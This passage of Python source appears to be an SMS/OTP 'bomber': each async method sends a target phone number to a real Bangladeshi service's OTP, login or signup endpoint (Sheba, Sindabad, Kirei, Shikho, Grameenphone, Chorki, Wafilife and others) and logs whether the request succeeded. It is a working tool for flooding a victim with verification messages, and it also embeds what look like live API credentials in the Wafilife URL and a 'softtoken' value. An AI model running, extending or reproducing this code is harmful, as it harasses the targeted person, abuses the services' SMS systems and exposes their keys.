                    await self.log_event("API15 - Sheba OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API15 - Sheba OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API15 - Sheba OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api16_apex4u_login(self):
        target = self.target
        url = "https://api.apex4u.com/api/auth/login"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API16 - Apex4U Login": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API16 - Apex4U Login": pass
            elif "Bioscope" in "API16 - Apex4U Login": payload = {"number": "+88" + target}
            elif "Proiojon" in "API16 - Apex4U Login": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API16 - Apex4U Login": payload = {"phone": target}
            elif "Medha" in "API16 - Apex4U Login": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API16 - Apex4U Login": payload = {"number": "+88" + target}
            elif "Robi" in "API16 - Apex4U Login": payload = {"phone_number": target}
            elif "Arogga" in "API16 - Apex4U Login": payload = {"mobile": target}
            elif "MyGP" in "API16 - Apex4U Login": pass
            elif "BDSTall" in "API16 - Apex4U Login": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API16 - Apex4U Login": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API16 - Apex4U Login": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API16 - Apex4U Login": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API16 - Apex4U Login": payload = {"phoneNumber": target}
            elif "Sindabad" in "API16 - Apex4U Login": payload = {"mobile": target}
            elif "Kirei" in "API16 - Apex4U Login": payload = {"phone": target}
            elif "Shikho" in "API16 - Apex4U Login": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API16 - Apex4U Login": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API16 - Apex4U Login", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API16 - Apex4U Login", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API16 - Apex4U Login", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api17_sindabad_otp(self):
        target = self.target
        url = "https://offers.sindabad.com/api/mobile-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API17 - Sindabad OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API17 - Sindabad OTP": pass
            elif "Bioscope" in "API17 - Sindabad OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API17 - Sindabad OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API17 - Sindabad OTP": payload = {"phone": target}
            elif "Medha" in "API17 - Sindabad OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API17 - Sindabad OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API17 - Sindabad OTP": payload = {"phone_number": target}
            elif "Arogga" in "API17 - Sindabad OTP": payload = {"mobile": target}
            elif "MyGP" in "API17 - Sindabad OTP": pass
            elif "BDSTall" in "API17 - Sindabad OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API17 - Sindabad OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API17 - Sindabad OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API17 - Sindabad OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API17 - Sindabad OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API17 - Sindabad OTP": payload = {"mobile": target}
            elif "Kirei" in "API17 - Sindabad OTP": payload = {"phone": target}
            elif "Shikho" in "API17 - Sindabad OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API17 - Sindabad OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API17 - Sindabad OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API17 - Sindabad OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API17 - Sindabad OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api18_kirei_otp(self):
        target = self.target
        url = "https://app.kireibd.com/api/v2/send-login-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API18 - Kirei OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API18 - Kirei OTP": pass
            elif "Bioscope" in "API18 - Kirei OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API18 - Kirei OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API18 - Kirei OTP": payload = {"phone": target}
            elif "Medha" in "API18 - Kirei OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API18 - Kirei OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API18 - Kirei OTP": payload = {"phone_number": target}
            elif "Arogga" in "API18 - Kirei OTP": payload = {"mobile": target}
            elif "MyGP" in "API18 - Kirei OTP": pass
            elif "BDSTall" in "API18 - Kirei OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API18 - Kirei OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API18 - Kirei OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API18 - Kirei OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API18 - Kirei OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API18 - Kirei OTP": payload = {"mobile": target}
            elif "Kirei" in "API18 - Kirei OTP": payload = {"phone": target}
            elif "Shikho" in "API18 - Kirei OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API18 - Kirei OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API18 - Kirei OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API18 - Kirei OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API18 - Kirei OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api19_shikho_sms(self):
        target = self.target
        url = "https://api.shikho.com/auth/v2/send/sms"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API19 - Shikho SMS": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API19 - Shikho SMS": pass
            elif "Bioscope" in "API19 - Shikho SMS": payload = {"number": "+88" + target}
            elif "Proiojon" in "API19 - Shikho SMS": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API19 - Shikho SMS": payload = {"phone": target}
            elif "Medha" in "API19 - Shikho SMS": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API19 - Shikho SMS": payload = {"number": "+88" + target}
            elif "Robi" in "API19 - Shikho SMS": payload = {"phone_number": target}
            elif "Arogga" in "API19 - Shikho SMS": payload = {"mobile": target}
            elif "MyGP" in "API19 - Shikho SMS": pass
            elif "BDSTall" in "API19 - Shikho SMS": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API19 - Shikho SMS": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API19 - Shikho SMS": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API19 - Shikho SMS": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API19 - Shikho SMS": payload = {"phoneNumber": target}
            elif "Sindabad" in "API19 - Shikho SMS": payload = {"mobile": target}
            elif "Kirei" in "API19 - Shikho SMS": payload = {"phone": target}
            elif "Shikho" in "API19 - Shikho SMS": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API19 - Shikho SMS": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API19 - Shikho SMS", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API19 - Shikho SMS", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API19 - Shikho SMS", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api20_circle_signup(self):
        target = self.target
        url = "https://reseller.circle.com.bd/api/v2/auth/signup"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API20 - Circle Signup": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API20 - Circle Signup": pass
            elif "Bioscope" in "API20 - Circle Signup": payload = {"number": "+88" + target}
            elif "Proiojon" in "API20 - Circle Signup": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API20 - Circle Signup": payload = {"phone": target}
            elif "Medha" in "API20 - Circle Signup": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API20 - Circle Signup": payload = {"number": "+88" + target}
            elif "Robi" in "API20 - Circle Signup": payload = {"phone_number": target}
            elif "Arogga" in "API20 - Circle Signup": payload = {"mobile": target}
            elif "MyGP" in "API20 - Circle Signup": pass
            elif "BDSTall" in "API20 - Circle Signup": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API20 - Circle Signup": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API20 - Circle Signup": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API20 - Circle Signup": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API20 - Circle Signup": payload = {"phoneNumber": target}
            elif "Sindabad" in "API20 - Circle Signup": payload = {"mobile": target}
            elif "Kirei" in "API20 - Circle Signup": payload = {"phone": target}
            elif "Shikho" in "API20 - Circle Signup": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API20 - Circle Signup": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API20 - Circle Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API20 - Circle Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API20 - Circle Signup", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api21_bdtickets_auth(self):
        target = self.target
        url = "https://api.bdtickets.com:20100/v1/auth"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API21 - BDTickets Auth": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API21 - BDTickets Auth": pass
            elif "Bioscope" in "API21 - BDTickets Auth": payload = {"number": "+88" + target}
            elif "Proiojon" in "API21 - BDTickets Auth": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API21 - BDTickets Auth": payload = {"phone": target}
            elif "Medha" in "API21 - BDTickets Auth": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API21 - BDTickets Auth": payload = {"number": "+88" + target}
            elif "Robi" in "API21 - BDTickets Auth": payload = {"phone_number": target}
            elif "Arogga" in "API21 - BDTickets Auth": payload = {"mobile": target}
            elif "MyGP" in "API21 - BDTickets Auth": pass
            elif "BDSTall" in "API21 - BDTickets Auth": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API21 - BDTickets Auth": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API21 - BDTickets Auth": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API21 - BDTickets Auth": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API21 - BDTickets Auth": payload = {"phoneNumber": target}
            elif "Sindabad" in "API21 - BDTickets Auth": payload = {"mobile": target}
            elif "Kirei" in "API21 - BDTickets Auth": payload = {"phone": target}
            elif "Shikho" in "API21 - BDTickets Auth": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API21 - BDTickets Auth": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API21 - BDTickets Auth", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API21 - BDTickets Auth", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API21 - BDTickets Auth", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api22_grameenphone_otp(self):
        target = self.target
        url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API22 - Grameenphone OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API22 - Grameenphone OTP": pass
            elif "Bioscope" in "API22 - Grameenphone OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API22 - Grameenphone OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API22 - Grameenphone OTP": payload = {"phone": target}
            elif "Medha" in "API22 - Grameenphone OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API22 - Grameenphone OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API22 - Grameenphone OTP": payload = {"phone_number": target}
            elif "Arogga" in "API22 - Grameenphone OTP": payload = {"mobile": target}
            elif "MyGP" in "API22 - Grameenphone OTP": pass
            elif "BDSTall" in "API22 - Grameenphone OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API22 - Grameenphone OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API22 - Grameenphone OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API22 - Grameenphone OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API22 - Grameenphone OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API22 - Grameenphone OTP": payload = {"mobile": target}
            elif "Kirei" in "API22 - Grameenphone OTP": payload = {"phone": target}
            elif "Shikho" in "API22 - Grameenphone OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API22 - Grameenphone OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API22 - Grameenphone OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API22 - Grameenphone OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API22 - Grameenphone OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api23_rfl_bestbuy_login(self):
        target = self.target
        url = "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API23 - RFL BestBuy Login": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API23 - RFL BestBuy Login": pass
            elif "Bioscope" in "API23 - RFL BestBuy Login": payload = {"number": "+88" + target}
            elif "Proiojon" in "API23 - RFL BestBuy Login": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API23 - RFL BestBuy Login": payload = {"phone": target}
            elif "Medha" in "API23 - RFL BestBuy Login": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API23 - RFL BestBuy Login": payload = {"number": "+88" + target}
            elif "Robi" in "API23 - RFL BestBuy Login": payload = {"phone_number": target}
            elif "Arogga" in "API23 - RFL BestBuy Login": payload = {"mobile": target}
            elif "MyGP" in "API23 - RFL BestBuy Login": pass
            elif "BDSTall" in "API23 - RFL BestBuy Login": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API23 - RFL BestBuy Login": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API23 - RFL BestBuy Login": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API23 - RFL BestBuy Login": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API23 - RFL BestBuy Login": payload = {"phoneNumber": target}
            elif "Sindabad" in "API23 - RFL BestBuy Login": payload = {"mobile": target}
            elif "Kirei" in "API23 - RFL BestBuy Login": payload = {"phone": target}
            elif "Shikho" in "API23 - RFL BestBuy Login": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API23 - RFL BestBuy Login": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API23 - RFL BestBuy Login", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API23 - RFL BestBuy Login", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API23 - RFL BestBuy Login", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api24_chorki_login(self):
        target = self.target
        url = "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API24 - Chorki Login": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API24 - Chorki Login": pass
            elif "Bioscope" in "API24 - Chorki Login": payload = {"number": "+88" + target}
            elif "Proiojon" in "API24 - Chorki Login": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API24 - Chorki Login": payload = {"phone": target}
            elif "Medha" in "API24 - Chorki Login": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API24 - Chorki Login": payload = {"number": "+88" + target}
            elif "Robi" in "API24 - Chorki Login": payload = {"phone_number": target}
            elif "Arogga" in "API24 - Chorki Login": payload = {"mobile": target}
            elif "MyGP" in "API24 - Chorki Login": pass
            elif "BDSTall" in "API24 - Chorki Login": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API24 - Chorki Login": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API24 - Chorki Login": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API24 - Chorki Login": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API24 - Chorki Login": payload = {"phoneNumber": target}
            elif "Sindabad" in "API24 - Chorki Login": payload = {"mobile": target}
            elif "Kirei" in "API24 - Chorki Login": payload = {"phone": target}
            elif "Shikho" in "API24 - Chorki Login": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API24 - Chorki Login": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API24 - Chorki Login", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API24 - Chorki Login", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API24 - Chorki Login", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api25_hishab_express_login(self):
        target = self.target
        url = "https://api.hishabexpress.com/login/status"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API25 - Hishab Express Login": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API25 - Hishab Express Login": pass
            elif "Bioscope" in "API25 - Hishab Express Login": payload = {"number": "+88" + target}
            elif "Proiojon" in "API25 - Hishab Express Login": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API25 - Hishab Express Login": payload = {"phone": target}
            elif "Medha" in "API25 - Hishab Express Login": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API25 - Hishab Express Login": payload = {"number": "+88" + target}
            elif "Robi" in "API25 - Hishab Express Login": payload = {"phone_number": target}
            elif "Arogga" in "API25 - Hishab Express Login": payload = {"mobile": target}
            elif "MyGP" in "API25 - Hishab Express Login": pass
            elif "BDSTall" in "API25 - Hishab Express Login": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API25 - Hishab Express Login": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API25 - Hishab Express Login": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API25 - Hishab Express Login": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API25 - Hishab Express Login": payload = {"phoneNumber": target}
            elif "Sindabad" in "API25 - Hishab Express Login": payload = {"mobile": target}
            elif "Kirei" in "API25 - Hishab Express Login": payload = {"phone": target}
            elif "Shikho" in "API25 - Hishab Express Login": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API25 - Hishab Express Login": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API25 - Hishab Express Login", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API25 - Hishab Express Login", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API25 - Hishab Express Login", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api26_chorcha_auth_check(self):
        target = self.target
        url = "https://mujib.chorcha.net/auth/check?phone={phone}"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API26 - Chorcha Auth Check": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API26 - Chorcha Auth Check": pass
            elif "Bioscope" in "API26 - Chorcha Auth Check": payload = {"number": "+88" + target}
            elif "Proiojon" in "API26 - Chorcha Auth Check": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API26 - Chorcha Auth Check": payload = {"phone": target}
            elif "Medha" in "API26 - Chorcha Auth Check": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API26 - Chorcha Auth Check": payload = {"number": "+88" + target}
            elif "Robi" in "API26 - Chorcha Auth Check": payload = {"phone_number": target}
            elif "Arogga" in "API26 - Chorcha Auth Check": payload = {"mobile": target}
            elif "MyGP" in "API26 - Chorcha Auth Check": pass
            elif "BDSTall" in "API26 - Chorcha Auth Check": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API26 - Chorcha Auth Check": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API26 - Chorcha Auth Check": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API26 - Chorcha Auth Check": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API26 - Chorcha Auth Check": payload = {"phoneNumber": target}
            elif "Sindabad" in "API26 - Chorcha Auth Check": payload = {"mobile": target}
            elif "Kirei" in "API26 - Chorcha Auth Check": payload = {"phone": target}
            elif "Shikho" in "API26 - Chorcha Auth Check": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API26 - Chorcha Auth Check": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API26 - Chorcha Auth Check", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API26 - Chorcha Auth Check", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API26 - Chorcha Auth Check", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api27_wafilife_otp(self):
        target = self.target
        url = "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API27 - Wafilife OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API27 - Wafilife OTP": pass
            elif "Bioscope" in "API27 - Wafilife OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API27 - Wafilife OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API27 - Wafilife OTP": payload = {"phone": target}
            elif "Medha" in "API27 - Wafilife OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API27 - Wafilife OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API27 - Wafilife OTP": payload = {"phone_number": target}
            elif "Arogga" in "API27 - Wafilife OTP": payload = {"mobile": target}
            elif "MyGP" in "API27 - Wafilife OTP": pass
            elif "BDSTall" in "API27 - Wafilife OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API27 - Wafilife OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API27 - Wafilife OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API27 - Wafilife OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API27 - Wafilife OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API27 - Wafilife OTP": payload = {"mobile": target}
            elif "Kirei" in "API27 - Wafilife OTP": payload = {"phone": target}
            elif "Shikho" in "API27 - Wafilife OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API27 - Wafilife OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API27 - Wafilife OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API27 - Wafilife OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
